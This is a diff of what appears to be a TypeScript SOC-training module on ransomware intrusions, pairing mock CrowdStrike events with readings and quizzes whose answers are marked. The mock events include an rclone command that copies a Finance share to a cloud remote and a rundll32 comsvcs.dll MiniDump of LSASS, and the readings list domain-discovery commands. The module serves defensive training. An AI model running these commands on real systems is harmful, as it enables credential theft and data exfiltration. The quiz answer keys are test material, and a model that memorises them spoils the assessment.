@@ -64,7 +64,7 @@ const lsassMiniDumpEvent: TelemetryEvent = {
     "crowdstrike.Tactic": "Credential Access",
     "crowdstrike.Technique": "OS Credential Dumping",
     "crowdstrike.PatternDispositionDescription": "Detected, no action taken",
-    "crowdstrike.ContextProcessName": "cmd.exe",
+    "crowdstrike.ContextProcessName": "rundll32.exe",
     "crowdstrike.ParentProcessName": "cmd.exe",
     "crowdstrike.FileName": "rundll32.exe",
     "crowdstrike.FilePath": "C:\\Windows\\System32\\rundll32.exe",
@@ -104,7 +104,7 @@ const rcloneExfilEvent: TelemetryEvent = {
     path: "C:\\Users\\Public\\rclone.exe",
     parent_name: "cmd.exe",
     parent_pid: 6108,
-    cmdline: "rclone.exe copy \\\\SRV-FILES-04\\Shared\\Finance Q4 gdrive-sync:archive --config C:\\Users\\Public\\rc.conf -q --transfers 16",
+    cmdline: "rclone.exe copy \\\\SRV-FILES-04\\Shared\\Finance-Q4 gdrive-sync:archive --config C:\\Users\\Public\\rc.conf -q --transfers 16",
     user: "NEXACORP\\j.reyes",
     hash: {
       sha256: "a2509bcefee31d3665c75a32efd9aad328b4a17611d0872dea92725027c4da7d",
@@ -126,7 +126,7 @@ const rcloneExfilEvent: TelemetryEvent = {
     "crowdstrike.ParentProcessName": "cmd.exe",
     "crowdstrike.FileName": "rclone.exe",
     "crowdstrike.FilePath": "C:\\Users\\Public\\rclone.exe",
-    "crowdstrike.CommandLine": "rclone.exe copy \\\\SRV-FILES-04\\Shared\\Finance Q4 gdrive-sync:archive --config C:\\Users\\Public\\rc.conf -q --transfers 16",
+    "crowdstrike.CommandLine": "rclone.exe copy \\\\SRV-FILES-04\\Shared\\Finance-Q4 gdrive-sync:archive --config C:\\Users\\Public\\rc.conf -q --transfers 16",
     "crowdstrike.SHA256HashData": "a2509bcefee31d3665c75a32efd9aad328b4a17611d0872dea92725027c4da7d",
     "crowdstrike.UserName": "NEXACORP\\j.reyes",
     "crowdstrike.HostName": "SRV-FILES-04",
@@ -263,16 +263,16 @@ const ransomwareLifecycleRoom = {
         "  RANSOM -->|remaining share| OP\n",
       diagramCaption: "The specialized, multi-party ransomware economy behind one intrusion",
       checkpoint: {
-        question: "Per Reading 1, why did ransomware operators add data exfiltration and leak-site threats (double extortion) on top of encryption?",
+        question: "A victim restores every encrypted server from clean, immutable backups within a day and refuses to pay. Per Reading 1, what leverage was double extortion designed to keep in the affiliate's hands in exactly this situation?",
         options: [
-          "Because encryption alone had become technically impossible to perform reliably on modern Windows systems",
-          "Because stronger offline and immutable backups meant a victim could often just restore and ignore an encryption-only ransom demand, so a second, independent form of leverage was needed",
-          "Because law enforcement banned ransom payments for encryption-only incidents in most countries, forcing a workaround",
-          "Because leak sites are required by ransomware insurance providers before any claim can be processed",
+          "The threat of a second encryption wave, since the affiliate's persistence usually survives a backup restore",
+          "A copy of sensitive data stolen before encryption, which no restore undoes and which can go up on a leak site",
+          "The decryption key's value for the endpoints the backups missed, since backups rarely cover every laptop",
+          "Control of the backups themselves, since affiliates now encrypt the backup repository before production",
         ],
         answer: 1,
         explanation:
-          "Reading 1 was explicit: once good backups made 'just restore and ignore the note' a viable option for encryption-only attacks, operators needed leverage that survived even a clean restore -- stolen data the victim cannot simply undo by recovering their files.",
+          "Reading 1 was explicit: once good backups made 'just restore and ignore the note' viable, operators added leverage that survives even a clean restore -- stolen data the victim cannot undo by recovering files. A second encryption wave is a re-infection risk, not the leverage double extortion adds. The key's value for endpoints the backups missed is still encryption leverage, the very thing a restore defeats. Encrypting the backup repository is a real tactic, but this victim's immutable backups survived, so it is not the leverage left in this case.",
       },
       xp: 5,
     },
@@ -304,16 +304,16 @@ const ransomwareLifecycleRoom = {
         "                                  many, then Event 4624 logon type 10\n" +
         "                                  (RemoteInteractive) once one succeeds",
       checkpoint: {
-        question: "Per Reading 2, why do unpatched internet-facing edge devices (VPN portals, SSL gateways) rank so highly among real ransomware initial-access statistics?",
+        question: "Per Reading 2, which combination of properties makes unpatched internet-facing edge devices (VPN portals, SSL gateways) such a frequent ransomware entry point?",
         options: [
-          "They don't -- edge devices are actually the least common ransomware entry point of the three covered in this reading",
-          "They are reachable from anywhere on the internet, usually run no EDR agent at all, and the window between a vulnerability's public disclosure and mass exploitation is often just days",
-          "Because edge devices always use weaker encryption than internal servers, making any traffic through them trivial to decrypt",
-          "Because edge devices are exempt from an organization's normal patch-management policy in every case",
+          "They cache every remote user's domain password, so one exploit yields domain-wide credentials as a DCSync would",
+          "They are reachable from anywhere, usually run no EDR agent, and are mass-exploited within days of a CVE's disclosure",
+          "Their accounts mostly belong to IT and helpdesk staff, the group that ransomware phishing deliberately targets first",
+          "They follow the workstation patch cycle, so one missed monthly update leaves them exposed for a whole month",
         ],
         answer: 1,
         explanation:
-          "Reading 2 was direct: these appliances are internet-facing by design, typically carry no EDR agent, run on their own vendor patch cycle, and the exploitation window after public disclosure is routinely measured in days -- a combination that makes them a consistently attractive target.",
+          "Reading 2 was direct: these appliances are internet-facing by design, typically carry no EDR agent, run on their own vendor patch cycle, and the exploitation window after public disclosure is routinely measured in days. Domain-wide credential harvesting is what Credential Access (LSASS, DCSync) does later -- an exploit grants a session, not every user's password. Targeting IT and helpdesk staff is how Reading 2 describes phishing, a different vector. And the reading says edge devices run their own separate vendor patch cycle, not the workstation one.",
       },
       xp: 5,
     },
@@ -355,19 +355,19 @@ const ransomwareLifecycleRoom = {
       content:
         "Once execution and persistence are in place, the affiliate needs to answer two questions before doing anything destructive: what does this network actually look like, and which single account can reach every host in it. Both questions point straight at Active Directory. The underlying mechanics — Kerberos tickets, LSASS, DCSync — were covered in depth in the Active Directory room; this reading is about how an affiliate applies those exact mechanics specifically toward the ransomware objective of domain-wide credential access.\n\n" +
         "**Discovery.** From a single foothold, a small set of commands maps the whole domain quickly: \"net group \\\"Domain Admins\\\" /domain\" and \"net group \\\"Enterprise Admins\\\" /domain\" enumerate the most privileged accounts directly; \"nltest /domain_trusts\" maps any trusted domains that could extend the intrusion's eventual blast radius; and \"whoami /groups\" checks the compromised account's own effective privileges — a genuinely valuable finding for an affiliate when AD group nesting quietly grants a Tier-1 helpdesk account far broader access than its job title suggests, which is exactly the kind of avoidable AD hygiene gap this room's own case study is built around. Increasingly, affiliates skip the manual commands entirely and run an automated collector (SharpHound and similar tools) that pulls this entire picture in one pass — visible on the wire, and to a Domain Controller's own logs, as a short burst of unusually high-volume LDAP queries, itself a real discovery-stage detection opportunity.\n\n" +
-        "**Credential access.** Once a specific privileged target is identified, LSASS memory access (T1003.001) harvests whatever credential material is cached on that one host — GrantedAccess 0x1FFFFF, PROCESS_ALL_ACCESS, requested against lsass.exe, exactly the pattern covered in this platform's EDR investigation content. DCSync (T1003.006) goes considerably further: if the affiliate reaches an account holding replication rights (Replicating Directory Changes / Replicating Directory Changes All), they can impersonate a Domain Controller and request every domain account's password hash in a single request, without ever touching LSASS on the DC itself — the Active Directory room already covered exactly why this is so much more efficient than dumping credentials host by host.\n\n" +
+        "**Credential access.** Once a specific privileged target is identified, LSASS memory access (T1003.001) harvests whatever credential material is cached on that one host — for example GrantedAccess 0x1FFFFF, PROCESS_ALL_ACCESS, requested against lsass.exe, the pattern covered in this platform's EDR investigation content; many dumpers request narrower masks instead (0x1010, 0x1410, 0x1438 — memory-read plus query rights), so a detection keyed only on 0x1FFFFF misses them. DCSync (T1003.006) goes considerably further: if the affiliate reaches an account holding replication rights (Replicating Directory Changes / Replicating Directory Changes All), they can impersonate a Domain Controller and request every domain account's password hash in a single request, without ever touching LSASS on the DC itself — the Active Directory room already covered exactly why this is so much more efficient than dumping credentials host by host.\n\n" +
         "**Why ransomware affiliates specifically need this, not just 'more access.'** Deploying an encryptor to a handful of hosts one at a time is a slow nuisance a SOC can usually catch and stop. Deploying it to every reachable server and workstation in one coordinated push — via Group Policy, PsExec, or an RMM tool, covered next in Lateral Movement — is what turns an intrusion into a company-wide outage in minutes, and that coordinated push requires exactly the kind of domain-wide administrative credential this stage exists to obtain.",
       checkpoint: {
         question: "Per Reading 4, why is DCSync (T1003.006) a more efficient credential-access method for a ransomware affiliate than dumping LSASS on individual hosts one at a time?",
         options: [
-          "DCSync isn't actually more efficient -- it requires physically visiting every workstation in the domain, exactly like host-by-host LSASS dumping does",
-          "DCSync lets an attacker with replication rights impersonate a Domain Controller and request every domain account's password hash in a single request, without touching LSASS on the DC at all",
-          "DCSync only works against a single specific user account and provides no advantage in scale over dumping one host's LSASS memory",
-          "DCSync is a Linux-only credential-access technique and has no relevance to a Windows Active Directory domain",
+          "It copies NTDS.dit straight off a Domain Controller's disk, so it needs only local admin on any one DC",
+          "An account holding replication rights poses as a DC and pulls every domain account's hash in one request",
+          "It replays one captured Kerberos ticket to every host, so no password hash ever has to be extracted",
+          "It dumps LSASS on the Domain Controller itself, where every account that ever logged on leaves a hash",
         ],
         answer: 1,
         explanation:
-          "Reading 4 -- consistent with the Active Directory room -- is specific: an account holding replication rights can request every domain account's hash from AD's replication mechanism in one shot, which is dramatically faster than compromising and dumping LSASS on host after host to build the same picture piecemeal.",
+          "Reading 4 -- consistent with the Active Directory room -- is specific: an account holding replication rights can request every domain account's hash through AD replication in one shot, far faster than dumping LSASS host after host. Copying NTDS.dit off the DC's disk is a different credential-access technique that needs file access on the DC, not replication rights. Replaying a Kerberos ticket is pass-the-ticket, which reuses one credential rather than harvesting all of them. And the reading stresses that DCSync works without touching LSASS on the DC at all.",
       },
       xp: 5,
     },
@@ -382,58 +382,58 @@ const ransomwareLifecycleRoom = {
       questions: [
         {
           question:
-            "crowdstrike.ContextProcessName and crowdstrike.ParentProcessName both show cmd.exe, and crowdstrike.CommandLine shows rundll32.exe launched with the argument \"C:\\Windows\\System32\\comsvcs.dll, MiniDump 668 ... full\". What is this specific pattern doing, and why would an affiliate prefer it over dropping a dedicated credential-dumping tool like Mimikatz?",
+            "crowdstrike.ParentProcessName shows cmd.exe, and crowdstrike.CommandLine shows rundll32.exe launched with the argument \"C:\\Windows\\System32\\comsvcs.dll, MiniDump 668 ... full\". Reading the whole event, what is this pattern doing, and why would an affiliate prefer it over dropping a dedicated credential-dumping tool like Mimikatz?",
           options: [
-            "This is a routine Windows debugging pattern that developers use constantly, and comsvcs.dll has no connection to process memory at all",
-            "rundll32.exe is invoking the MiniDump export inside comsvcs.dll -- a legitimate, signed Windows DLL -- to write a full memory dump of the process with PID 668 to disk; using a built-in DLL this way avoids dropping a separate, easily-signatured credential-dumping binary onto the host",
-            "comsvcs.dll is a mail server component, so this command line is unrelated to credential theft and is most likely a mail client crash handler running normally",
-            "This command line cannot be evaluated at all without first knowing the file's antivirus reputation score from a third-party feed",
+            "A MiniDump-style memory capture, but nothing in the event ties PID 668 to lsass.exe, so it cannot yet count as credential access",
+            "rundll32.exe calls comsvcs.dll's MiniDump export to write PID 668's full memory to disk -- a signed Windows DLL, so no dumper is dropped",
+            "Windows Error Reporting collecting a crash dump of PID 668 -- the wer-prefixed .tmp name is benign WER output, not a credential dump",
+            "comsvcs.dll is injected into lsass.exe to read credentials in place, so no memory dump is written and no tool ever touches the disk",
           ],
           answer: 1,
           explanation:
-            "comsvcs.dll genuinely ships with Windows and genuinely exports a MiniDump function -- using it via rundll32.exe is a well-documented living-off-the-land credential-dumping technique precisely because it avoids ever writing a separate, obviously-malicious tool to disk. Calling comsvcs.dll a mail server component invents a wrong purpose for the DLL, and insisting on a third-party reputation score first ignores that the command line itself, read correctly, already tells the story before any external reputation lookup.",
+            "comsvcs.dll ships with Windows and exports a MiniDump function -- calling it via rundll32.exe is a well-documented living-off-the-land dumping technique precisely because no separate, easily-signatured tool is written to disk. The event does tie PID 668 to LSASS: crowdstrike.TargetProcessName is lsass.exe and crowdstrike.TargetProcessId is 668. Genuine WER crash collection is not a cmd.exe-spawned rundll32 calling comsvcs.dll's MiniDump against lsass.exe -- the wer-style name is camouflage. And the command line passes an output path and the word full, so a dump file is written to disk; nothing is injected into LSASS.",
           xp: 30,
         },
         {
           question:
-            "crowdstrike.TargetProcessName reads lsass.exe and crowdstrike.GrantedAccess reads 0x1FFFFF. Given this room's earlier reading on why ransomware affiliates specifically pursue domain-wide credential access, why does this specific access matter beyond \"this host's local secrets got dumped\"?",
+            "crowdstrike.TargetProcessName reads lsass.exe and crowdstrike.GrantedAccess reads 0x1FFFFF. Combining this with the account context in the case description, how should the analyst weigh this access?",
           options: [
-            "It doesn't matter beyond this one host -- LSASS only ever caches credential material for accounts that have never logged on anywhere else in the domain",
-            "0x1FFFFF is PROCESS_ALL_ACCESS -- full control over lsass.exe, the process holding cached credential material -- and per Reading 4, this specific j.reyes account carries indirect Domain Admin rights through AD group nesting, meaning whatever gets harvested here can plausibly unlock domain-wide access, not just this one workstation",
-            "GrantedAccess is purely a network-layer field describing firewall rule matches and has no relationship to process memory access at all",
-            "0x1FFFFF only has meaning if the target process is a Windows service, and lsass.exe does not qualify as one",
+            "0x1FFFFF is PROCESS_ALL_ACCESS, the only mask able to read LSASS memory, so a rule keyed on it catches every LSASS dumper",
+            "PROCESS_ALL_ACCESS on lsass.exe exposes its cached credentials, and j.reyes's nested Domain Admin rights make the reach domain-wide",
+            "Full access to lsass.exe exposes only this host's local SAM accounts, so the blast radius stays limited to WKS-IT-0417 itself",
+            "The access is serious, but j.reyes is Tier-1 helpdesk, so anything harvested reaches only the systems helpdesk staff administer",
           ],
           answer: 1,
           explanation:
-            "0x1FFFFF is the PROCESS_ALL_ACCESS mask, and against lsass.exe it grants exactly the access a credential dumper needs. What raises the stakes here specifically is the context this room already established: j.reyes's account carries indirect Domain Admin rights, so this single-host credential dump is a plausible domain-wide compromise, not an isolated local event.",
+            "0x1FFFFF is PROCESS_ALL_ACCESS, and against lsass.exe it grants what a credential dumper needs; the context raises the stakes, because j.reyes's token carries indirect Domain Admin rights through group nesting, so this single-host dump is a plausible domain-wide compromise. Reading 4 notes many dumpers use narrower masks (0x1010, 0x1410, 0x1438), so a rule keyed only on 0x1FFFFF misses them. LSASS holds cached credentials of accounts that logged on to the host, including domain accounts -- not just local SAM accounts. And judging reach by the Tier-1 job title is exactly the trap the group-nesting issue in the context warns about.",
           xp: 35,
         },
         {
           question:
-            "crowdstrike.FilePath for the memory dump output is C:\\ProgramData\\Adobe\\ARM\\wer4A21.tmp -- a path and naming convention that closely resembles Adobe's own legitimate crash-reporting artifacts. Why would an affiliate deliberately choose this specific location and naming pattern for the dump file?",
+            "crowdstrike.CommandLine sends the memory dump to C:\\ProgramData\\Adobe\\ARM\\wer4A21.tmp -- a folder and naming style that resemble Adobe's updater and Windows crash-report artifacts. Why would an affiliate choose this location and name for the dump file?",
           options: [
-            "It's a coincidence with no investigative meaning -- Windows randomly assigns temp file locations and this path was simply the next one available",
-            "To blend the dump artifact in among genuine, expected Adobe Reader crash-report files, so a defender skimming file listings under C:\\ProgramData doesn't immediately flag an unfamiliar .tmp file sitting in a folder that legitimately contains many similar-looking ones",
-            "Because comsvcs.dll's MiniDump function is hard-coded to only write files inside Adobe's installation directory, regardless of what the operator specifies",
-            "Because writing to an Adobe-branded folder automatically grants SYSTEM-level file permissions that no other folder on the host would provide",
+            "Because ProgramData is writable without admin rights, so it was simply the first place j.reyes's token could write the file",
+            "To blend in: a wer-named .tmp in an Adobe updater folder looks like routine crash output to anyone skimming the directory",
+            "To stage the dump beside Adobe updater traffic, so it can later leave the host disguised as an ARM update download",
+            "Because Windows purges .tmp files at the next reboot, deleting the dump before forensic collection can reach it",
           ],
           answer: 1,
           explanation:
-            "This is a masquerading choice, not a technical requirement -- comsvcs.dll's MiniDump function will happily write to any path supplied on the command line. Choosing a path and naming style that mimics a real, commonly-present Adobe crash-report artifact is a deliberate attempt to blend in with a folder a defender is unlikely to scrutinize file-by-file.",
+            "This is a masquerading choice -- MiniDump writes wherever the command line says, and a wer-style .tmp in a vendor folder is a file a defender is unlikely to scrutinise one by one. Writability does not explain it: j.reyes's token carries Domain Admin rights, so many locations were writable, and the Adobe folder plus WER-style name are deliberate. The dump's location says nothing about how it leaves the host; exfiltration is a later, separate stage. And Windows does not purge .tmp files at reboot because of their extension -- the file stays until something deletes it.",
           xp: 30,
         },
         {
           question:
             "crowdstrike.PatternDispositionDescription reads \"Detected, no action taken,\" meaning Falcon only observed this LSASS access rather than stopping it. Given everything in this finding -- the LOLBin technique, the masquerading dump path, and j.reyes's indirect Domain Admin rights -- what should the analyst do immediately?",
           options: [
-            "Close the detection as informational, since \"Detected, no action taken\" is Falcon's own signal that the pattern wasn't serious enough to worry about",
-            "Treat every credential this account could plausibly reach as compromised right now, begin emergency credential rotation and scoping across the domain (not just this one workstation), and escalate immediately -- waiting to see what happens next only gives an affiliate more time to use exactly the access this finding shows they may already have",
-            "Wait for a second, independent finding on a different host before taking any action at all, since one credential-access detection alone is never sufficient grounds to begin rotation",
-            "Reimage WKS-IT-0417 immediately as the complete remediation, since credential material only ever affects the specific host it was dumped from",
+            "Isolate and reimage WKS-IT-0417, since the dump file and the affiliate's foothold both live on that one workstation",
+            "Treat every credential j.reyes's token can reach as compromised: start domain-wide rotation and scoping, and escalate now",
+            "Watch j.reyes's account for a second alert first, since \"Detected, no action taken\" means Falcon rated the access low-risk",
+            "Reset only j.reyes's password and revoke his sessions, since the dump ran under his account and that closes the exposure",
           ],
           answer: 1,
           explanation:
-            "\"Detected, no action taken\" means the dump was never stopped -- it raises urgency rather than lowering it. Given the domain-wide reach this specific account plausibly has, the correct response treats potentially domain-wide credentials as compromised immediately rather than waiting for further proof, and reimaging one workstation does nothing to address credentials that may already be usable against dozens of other hosts.",
+            "\"Detected, no action taken\" means the dump was never stopped -- it raises urgency rather than lowering it, so waiting for a second alert hands the affiliate time to use what was taken. Isolating the workstation is reasonable, but treating a reimage as the remediation ignores that the dumped credentials are now usable from anywhere. Resetting only j.reyes's password misses that an LSASS dump also captures other accounts cached on the host. Given the domain-wide reach of this token, the right response is domain-wide rotation, scoping and immediate escalation.",
           xp: 40,
         },
       ],
@@ -452,14 +452,14 @@ const ransomwareLifecycleRoom = {
       checkpoint: {
         question: "Per Reading 5, what is the actual signal that separates a genuine PsExec-based lateral-movement attack from an administrator's routine use of the same tool?",
         options: [
-          "There is no way to tell the difference -- any PSEXESVC service creation should always be treated as a confirmed attack regardless of context",
-          "The repeating pattern itself -- the same account authenticating (logon type 3) and creating a PSEXESVC service across multiple hosts within a short window -- combined with whether that account, source, and timing are actually expected, not the mere presence of PsExec",
-          "PsExec is inherently malicious software, so its presence alone is always sufficient grounds to treat any finding as a confirmed attack with no further review needed",
-          "Only the specific service name PSEXESVC matters -- if an attacker renames the service to anything else, the activity becomes undetectable by definition and no further signal exists",
+          "The 7045 service name: admins' PsExec creates PSEXESVC, so a renamed service is the reliable sign of an attacker",
+          "One account repeating type 3 logon then PSEXESVC across many hosts in minutes, from an unexpected source or hour",
+          "The logon type: admins run PsExec from inside RDP sessions (type 10), while an attacker's PsExec shows type 3",
+          "WmiPrvSE.exe as the parent of the remote command, which PsExec produces only when an attacker is driving it",
         ],
         answer: 1,
         explanation:
-          "Reading 5 was explicit that PsExec is legitimate and used constantly by IT -- the tell is the pattern (repetition across hosts, unusual account/source/timing), not the tool's identity. The 'only the service name matters' option overclaims too: a renamed service still leaves the underlying network-logon-then-service-creation pattern, which is exactly why reading the pattern matters more than matching one exact string.",
+          "Reading 5 was explicit that PsExec is legitimate and used constantly by IT -- the tell is the pattern (repetition across hosts in a short window, unexpected account/source/timing), not the tool. A renamed service is one possible attacker choice, but the default PSEXESVC name proves nothing either way, so the service name alone cannot separate admin from attacker. PsExec's target-side logon is type 3 whoever runs it; type 10 is the RDP logon on a different host. And WmiPrvSE.exe as the parent is the WMI lateral-movement giveaway, not something PsExec produces.",
       },
       xp: 5,
     },
@@ -472,7 +472,7 @@ const ransomwareLifecycleRoom = {
       options: [
         "Reconnaissance rather than lateral movement -- a type 3 logon plus a service creation only enumerates hosts for later targeting, and no attacker code has actually executed on either server yet",
         "A single administrator managing two servers -- logon type 3 is routine for remote administration, and two hosts nine minutes apart from one source IP fits ordinary patching cadence",
-        "PsExec lateral movement with the j.reyes credential flagged earlier -- the same account and source IP repeating the type 3 logon then PSEXESVC pattern across servers, so scope every host it touched tonight",
+        "PsExec lateral movement with the j.reyes credential -- the same account and source IP repeating the type 3 logon then PSEXESVC pattern across servers, so scope every host it touched tonight",
         "The ransomware encryption stage already in progress -- a PSEXESVC service on a second server means the encryptor is being pushed fleet-wide, so this should be handled as detonation",
       ],
       answer: 2,
@@ -491,7 +491,7 @@ const ransomwareLifecycleRoom = {
         { id: "edge", left: "Affiliate exploits an unpatched, internet-facing VPN appliance", right: "T1190 -- Exploit Public-Facing Application" },
         { id: "sched", left: "Scheduled task re-launches the payload after reboot, and later fires the encryptor fleet-wide", right: "T1053.005 -- Scheduled Task" },
         { id: "lsass", left: "rundll32.exe + comsvcs.dll dumps lsass.exe's memory on one workstation", right: "T1003.001 -- LSASS Memory" },
-        { id: "dcsync", left: "Attacker requests replication rights from a Domain Controller to pull every password hash at once", right: "T1003.006 -- DCSync" },
+        { id: "dcsync", left: "An account that already holds replication rights asks a Domain Controller to replicate every password hash at once", right: "T1003.006 -- DCSync" },
         { id: "psexec", left: "PsExec pushes access to additional hosts using a stolen credential", right: "T1021.002 -- SMB/Windows Admin Shares" },
         { id: "vss", left: "vssadmin deletes every shadow copy on a host before encryption starts", right: "T1490 -- Inhibit System Recovery" },
         { id: "clearlog", left: "Windows Security event log is cleared right after the intrusion", right: "T1070.001 -- Clear Windows Event Logs" },
@@ -557,16 +557,16 @@ const ransomwareLifecycleRoom = {
         "  end\n",
       diagramCaption: "How the order of operations shifted from encryption-first to exfiltration-first",
       checkpoint: {
-        question: "Per Reading 7, why does the exfiltration-staging window matter more operationally than almost any other stage in the ransomware lifecycle?",
+        question: "Per Reading 7, why is the exfiltration-staging window often the highest-value point for a SOC to intervene in a current-model intrusion?",
         options: [
-          "It doesn't -- every stage of a ransomware intrusion carries exactly equal operational importance for the SOC, with no single stage mattering more than any other",
-          "It is very often the last point in the intrusion where stopping the attack genuinely changes the outcome -- once encryption starts, availability damage is largely locked in, but a caught exfiltration attempt can mean the attacker's leverage never actually leaves the network",
-          "It matters only because exfiltrated data is always immediately deleted from the attacker's infrastructure the moment a SOC detects it, undoing the theft completely",
-          "It matters less than the encryption stage, since only encrypted files ever cause any real business impact to the victim organization",
+          "Staging comes before credential access, so cutting it off removes the affiliate's route to domain-wide privileges",
+          "It is often the last point where acting changes the outcome: the stolen data, the attacker's leverage, has not left yet",
+          "Once the data is out, the leak threat is moot anyway as long as clean, tested backups let the victim restore and move on",
+          "Many campaigns now skip encryption entirely, so staging is usually the only stage that produces any telemetry",
         ],
         answer: 1,
         explanation:
-          "Reading 7 was explicit about this: encryption's damage to availability is largely fixed once it starts, but exfiltration caught during staging can prevent the double-extortion leverage from ever existing in the attacker's hands at all -- which is exactly why it deserves this much attention rather than being treated as a footnote before the 'real' encryption event.",
+          "Reading 7 was explicit: encryption's damage to availability is largely fixed once it starts, but exfiltration caught during staging can stop the double-extortion leverage from ever reaching the attacker. In the current model, staging comes after credential access and lateral movement, not before. Reading 1 explains that backups do nothing against a leak threat -- that is why double extortion exists. And the 'encryption-optional' trend means some campaigns skip encryption; it does not make staging the only stage with telemetry -- this room shows detections at nearly every stage.",
       },
       xp: 5,
     },
@@ -581,58 +581,58 @@ const ransomwareLifecycleRoom = {
       questions: [
         {
           question:
-            "crowdstrike.FilePath shows the transfer tool running from C:\\Users\\Public\\rclone.exe, launched under cmd.exe rather than any documented backup process. What should this specific detail make an analyst want to check first -- and what should it NOT be treated as?",
+            "crowdstrike.FilePath shows the transfer tool running from C:\\Users\\Public\\rclone.exe, and crowdstrike.ParentProcessName is cmd.exe. What should these details make the analyst check first?",
           options: [
-            "It should be treated as absolute proof of malicious activity on its own, since rclone.exe is malware by definition and its mere presence anywhere on a host is always a confirmed compromise",
-            "It should prompt checking whether this file server has any legitimate, documented reason to run a transfer tool from a generic public user folder rather than a normal installed-software location -- rclone itself is a legitimate, widely-used tool, so the unusual location and launch method are the signal worth investigating, not the tool's name",
-            "It should be dismissed immediately, since any file located under C:\\Users\\Public is automatically trusted by Windows and cannot be flagged by security tooling",
-            "It should only be investigated if the file's SHA256 hash comes back as a known-bad signature in a public threat intelligence feed -- otherwise no further review is warranted",
+            "Nothing further on the path: rclone is a known exfiltration tool, so its mere presence on a server already confirms the compromise",
+            "Why a transfer tool runs from a public folder via cmd.exe on a server with no documented need -- location and launch are the signal",
+            "Whether the SHA256 matches a known-bad hash, since an unmodified rclone build is benign wherever it happens to be launched",
+            "Whether j.reyes appears on rclone's software-approval list, since an approved tool run by an approved user is routine",
           ],
           answer: 1,
           explanation:
-            "rclone is genuinely legitimate, widely-used software -- this room's own analyst_choice task later shows a completely benign use of the identical tool. What's actually worth checking here is the unusual location (a generic Public user folder rather than an installed-software path) and the fact it was launched manually under cmd.exe rather than through any documented process -- exactly the kind of context-dependent reasoning this room has taught throughout, not a name-based reflex in either direction.",
+            "rclone is legitimate, widely-used software -- this room's analyst_choice task shows a benign use of the identical tool -- so the tool's name alone confirms nothing. What matters is the unusual location (a generic Public folder, not an installed-software path) and the manual cmd.exe launch on a server whose only documented transfer job is something else. A clean hash only says the binary is genuine rclone; a genuine tool can still carry stolen data. And an approval list for the user does not authorise this specific transfer: an approved admin running rclone outside any ticket is still unexplained activity.",
           xp: 30,
         },
         {
           question:
-            "crowdstrike.CommandLine reads: rclone.exe copy \\\\SRV-FILES-04\\Shared\\Finance Q4 gdrive-sync:archive --config C:\\Users\\Public\\rc.conf -q --transfers 16. What does this specific command line reveal about the scope and intent of the transfer?",
+            "Read crowdstrike.CommandLine in the event above. What does it reveal about the scope and intent of the transfer?",
           options: [
-            "Nothing meaningful -- rclone command lines are generated randomly and carry no information about what is actually being copied or where it is going",
-            "It targets specifically the Finance department's Q4 share as the source, uses \"-q\" (quiet mode, suppressing normal console output) and a high transfer-parallelism setting to move data quickly, and sends it to a remote named \"gdrive-sync\" -- a name with no match in any list of NexaCorp's approved cloud-storage destinations",
-            "It proves the transfer is completely safe, since the word \"sync\" in the remote name \"gdrive-sync\" confirms this is an official, IT-sanctioned Google Drive backup integration",
-            "The --transfers 16 flag is a Windows-only network diagnostic setting used exclusively for testing internet connectivity, unrelated to file transfer",
+            "A routine sync job: copy only adds files missing at the destination, and -q merely hides progress, as scheduled backups do",
+            "A targeted pull of the Finance-Q4 share, run quietly with 16 parallel transfers, to a remote defined in a config left in Public",
+            "Limited impact: copy leaves the source files intact, so nothing is lost and this ranks below a move or sync that deletes data",
+            "A Google Drive backup: the gdrive-sync remote name shows an IT-built integration, so only the change ticket needs checking",
           ],
           answer: 1,
           explanation:
-            "Reading the command line closely -- not just noting that rclone ran -- shows a specific, high-value target (Finance Q4), deliberate quiet/high-throughput settings, and a destination remote name that doesn't match anything on NexaCorp's approved list. A friendly-sounding remote name proves nothing about legitimacy on its own, which is exactly the trap of reading 'sync' in 'gdrive-sync' as proof of an IT-sanctioned integration.",
+            "Read closely, the command line shows a specific high-value source (the Finance-Q4 share), quiet output (-q), 16 parallel transfers for speed, and a remote defined in rc.conf sitting in C:\\Users\\Public -- not a managed config path. Calling it a routine sync ignores that the only documented backup on this server is the Veeam job writing on-premises. Copy leaving the source intact is exactly what exfiltration wants: the damage is the stolen copy, not lost files. And a friendly-sounding remote name like gdrive-sync proves nothing; the remote is whatever the dropped config file says it is.",
           xp: 35,
         },
         {
           question:
-            "crowdstrike.UserName shows NEXACORP\\j.reyes -- the exact account this room's credential-access finding on WKS-IT-0417 flagged, two hours earlier, as carrying indirect Domain Admin rights. Why does this specific correlation matter more than treating this finding as a brand-new, unrelated case?",
+            "crowdstrike.UserName on this detection is NEXACORP\\j.reyes. How should the analyst relate this finding to the rest of tonight's activity?",
           options: [
-            "It doesn't matter -- the two hosts and events are far enough apart in time and location that they should always be triaged as completely separate, unrelated cases",
-            "It confirms this is very likely the same intrusion continuing to unfold: the credential harvested from WKS-IT-0417 is now plausibly being used to reach and exfiltrate from a file server two hours later, which is exactly the domain-wide reach Reading 4 warned this account's privilege-nesting issue could enable",
-            "It matters only for billing purposes, since CrowdStrike licenses are tracked per user account regardless of what activity is observed",
-            "It proves the two events must have been performed by two different people who happen to share login credentials, since one person cannot plausibly act on two hosts in one night",
+            "As a separate case: the account matches, but a different host and a two-hour gap point to unrelated activity",
+            "As the same intrusion: the credential dumped on WKS-IT-0417 two hours ago is plausibly now driving this exfiltration",
+            "Link them only if j.reyes logged on to SRV-FILES-04 interactively, since stolen credentials cannot run remote commands",
+            "As insider activity: one named user acting on two hosts in one night points to j.reyes himself, not stolen credentials",
           ],
           answer: 1,
           explanation:
-            "Treating separated-in-time, separated-in-host findings as unrelated is exactly the sibling-alert mistake this platform's EDR content warned against -- here, the shared account is the thread connecting a domain-wide credential theft to its very next plausible use two hours later, which is precisely the kind of correlation a real investigation is built to catch.",
+            "This is the account whose token was dumped on WKS-IT-0417 two hours earlier and carries indirect Domain Admin rights -- its next use, on a high-value file server, is the thread connecting credential theft to exfiltration. Splitting them by host and time is the sibling-alert mistake this platform's EDR content warned against. Stolen credentials run remote commands all the time -- PsExec and WMI in Reading 5 do exactly that over network logons. And reading this as the user himself ignores that his credentials were just dumped at 02:47 by a LOLBin on his workstation; the account name says whose credential was used, not who typed.",
           xp: 30,
         },
         {
           question:
             "it_verify_result reads \"unverified,\" and it_verify_message notes the file server's only documented backup tool is the nightly Veeam Agent job -- not rclone. Combined with everything else in this finding, what should the analyst do right now?",
           options: [
-            "Wait to see whether encryption activity appears anywhere in the fleet before taking any action on this specific finding, since exfiltration alone is never worth an urgent response on its own",
